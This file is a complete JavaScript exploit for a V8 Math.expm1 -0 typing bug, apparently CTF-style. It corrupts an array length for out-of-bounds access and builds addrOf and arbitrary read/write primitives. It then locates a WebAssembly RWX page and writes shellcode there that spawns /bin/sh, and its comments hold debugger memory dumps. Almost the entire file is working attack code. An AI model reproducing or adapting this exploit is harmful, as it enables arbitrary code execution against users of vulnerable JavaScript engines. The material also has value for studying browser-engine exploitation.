/*

exploit for math.expm1

*/

// tookits
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x" + i.toString(16).padStart(16, "0");
}


// const
const MAX_ITERATIONS = 100000;


// start pwn
let oob_array;
let leak_obj;
let rw_arraybuffer;
let obj = {};

function addrOf(obj){
    leak_obj.n = obj;
    return f2i(oob_array[leak_obj_offset]) - 1;
}


function fakeObj(obj, addr){
    oob_array[leak_obj_offset] = i2f(addr);
    leak_obj.n = obj;
}


function read64(addr){
    oob_array[rw_arraybuffer_offset] = i2f(addr);
    let data_view = new DataView(rw_arraybuffer);
    return f2i(data_view.getFloat64(0, true));
}

function write32(addr, value){
    oob_array[rw_arraybuffer_offset] = i2f(addr);
    let data_view = new DataView(rw_arraybuffer);
    data_view.setInt32(0, value, true);
}

function write_payloads(addr, payloads){
    oob_array[rw_arraybuffer_offset] = i2f(addr);
    let data_view = new DataView(rw_arraybuffer);
    for(let i = 0; i < payloads.length; ++i){
        data_view.setUint8(i, payloads[i]);
    }
}

var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1,
127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0,
1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2,
0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 10, 11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var func = wasmInstance.exports.main;


function foo(x){
    let tmp = {escape:-0};
    var a = [1.1, 2.2, 3.3];

    oob_array = [3.3, 4.4, 5.5];
    leak_obj = {m:i2f(0xdeadbeef), n:obj};
    rw_arraybuffer = new ArrayBuffer(0x4321);

    // %DebugPrint(a);
    // %DebugPrint(oob_array);
    // %SystemBreak();

    let idx = Object.is(Math.expm1(x), tmp.escape);
    /*

    pwndbg> x/30gx 0x04778cd8bb30 // elements: 0x04778cd8bb31 <FixedDoubleArray[3]> 
    0x4778cd8bb30:  0x00001dc2ca301459      0x0000000300000000
    0x4778cd8bb40:  0x3ff199999999999a      0x400199999999999a
    0x4778cd8bb50:  0x400a666666666666      0x00001dc2ca301459
    0x4778cd8bb60:  0x0000000300000000      0x400a666666666666
    0x4778cd8bb70:  0x401199999999999a      0x4016000000000000
    0x4778cd8bb80:  0x00002dd3e9b02cf9      0x00001dc2ca300c21
    0x4778cd8bb90:  0x000004778cd8bbb1      0x0000000300000000 // length of oob_array

    so, I should overwrite elements with idx 11
    */
    idx *= 11; // get this from debug
    a[idx] = i2f(0x111100000000); // change length
    return a[idx];
}

foo(0);
for(let i = 0; i < MAX_ITERATIONS; ++i){
    foo("0");
}

foo(-0);


if(oob_array.length > 3){
    print("[+] oob sucessed!")
    print("[+] oob_array length : " + oob_array.length);
}else{
    throw "oob failed";
}


let leak_obj_offset = 0;
let rw_arraybuffer_offset = 0;

for(let i = 0; i < 0x10000; ++i){
    value = oob_array[i];
    if(f2i(value) == 0xdeadbeef){
        print("[+] get leak_obj at : " + i);
        leak_obj_offset = i + 1;
        break;
    }
}

for(let i = 0; i < 0x10000; ++i){
    value = oob_array[i];
    if(f2i(value) == 0x4321){
        print("[+] get rw_arraybuffer at : " + i);
        rw_arraybuffer_offset = i + 1;
        break;
    }
}

if(leak_obj_offset == 0 || rw_arraybuffer_offset ==0) throw "get index error"



%DebugPrint(func);
var wasm_func_addr = addrOf(func);
print("[+] wasm func addr : " + hex(wasm_func_addr));
var shared_info = read64(wasm_func_addr + 0x18) - 1;
print("[+] wasm shared info : " + hex(shared_info));
var data_address = read64(shared_info + 0x8) - 1;
print("[+] data_address : " + hex(data_address));
var instance_address = read64(data_address + 0x10) - 1;
print("[+] instance_address : " + hex(instance_address));
var rwx_address = read64(instance_address + 0xe8);
print("[+] rwx_address : " + hex(rwx_address));


/*
   0x39295ef65000    int3   
 ► 0x39295ef65001    int3   
        rdi: 0x19c12659fc01 ◂— 0x21000038ccfbc041
        rsi: 0x19c12659fa21 ◂— 0x21000038ccfbc095
        rdx: 0x36b104804d1 ◂— 0x36b104805
        r10: 0x5555566daca9 ◂— 0x100000000
   0x39295ef65002    add    byte ptr [rax], al
   0x39295ef65004    neg    byte ptr [rsi + 0x29]
   0x39295ef65007    cmp    dword ptr [rax], eax
   0x39295ef65009    add    byte ptr [rcx - 1], al
   0x39295ef6500c    loop   0x39295ef6501d
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffd890 —▸ 0x3aee3dc02080 ◂— mov    rbx, qword ptr [rbp - 0x18]
01:0008│      0x7fffffffd898 —▸ 0x19c12659fa21 ◂— 0x21000038ccfbc095
02:0010│      0x7fffffffd8a0 —▸ 0x19c12659fc01 ◂— 0x21000038ccfbc041
03:0018│      0x7fffffffd8a8 —▸ 0x19c126581749 ◂— 0x36b10480f
04:0020│ rbp  0x7fffffffd8b0 —▸ 0x7fffffffd940 —▸ 0x7fffffffd968 —▸ 0x7fffffffd9d0 —▸ 0x7fffffffdac0 ◂— ...
05:0028│      0x7fffffffd8b8 —▸ 0x5555563bbef5 (Builtins_InterpreterEntryTrampoline+565) ◂— mov    r14, qword ptr [rbp - 0x18]
06:0030│      0x7fffffffd8c0 —▸ 0x281e98880139 ◂— 0x21000038ccfbc07e
07:0038│      0x7fffffffd8c8 —▸ 0x29ca0f40c149 ◂— 0x36b104805
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0     39295ef65001
   f 1     3aee3dc02080
   f 2     19c12659fa21
   f 3     19c12659fc01
   f 4     19c126581749
   f 5     7fffffffd940
   f 6     5555563bbef5 Builtins_InterpreterEntryTrampoline+565
   f 7     281e98880139
   f 8     29ca0f40c149
   f 9      36b104804d1
   f 10     cccc00000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap 0x39295ef65001
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x39295ef65000     0x39295ef66000 rwxp     1000 0      
pwndbg> 

*/
// write32(rwx_address, 0xcccc);

// var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
//     96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
//     105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
//     72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
//     72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
//     184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
//     94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

// write_payloads(rwx_address, shellcode);
// var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
// for(let i = 0; i < shellcode.length; ++i){
//     write32(rwx_address + i, shellcode[i]);
// }

write32(rwx_address, 0x99583b6a);
write32(rwx_address + 0x4, 0x2fbb4852);
write32(rwx_address + 0x8, 0x6e69622f);
write32(rwx_address + 0xc, 0x5368732f);
write32(rwx_address + 0x10, 0x57525f54);
write32(rwx_address + 0x14, 0x050f5e54);

func();